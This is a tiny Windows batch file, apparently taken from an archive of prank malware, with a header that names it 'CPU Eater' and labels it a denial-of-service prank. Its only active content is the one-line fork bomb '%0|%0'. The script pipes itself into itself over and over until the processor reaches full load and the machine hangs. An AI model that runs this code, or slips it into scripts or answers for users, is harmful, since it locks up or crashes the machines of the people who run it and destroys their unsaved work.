:: ------------------------------------------------------------
:: name      CPU Eater
:: type      prank/dos
:: cve       —
:: year      —
:: os        windows
:: authors   unknown
:: source    https://github.com/MinhasKamal/CuteVirusCollection
:: archived  krisyotam
:: notes     batch fork bomb via pipe recursion; 100% CPU
:: ------------------------------------------------------------

:: Recursively calls itself via pipe, consuming 100% CPU.
:: Source: www.technicalnews.in
%0|%0
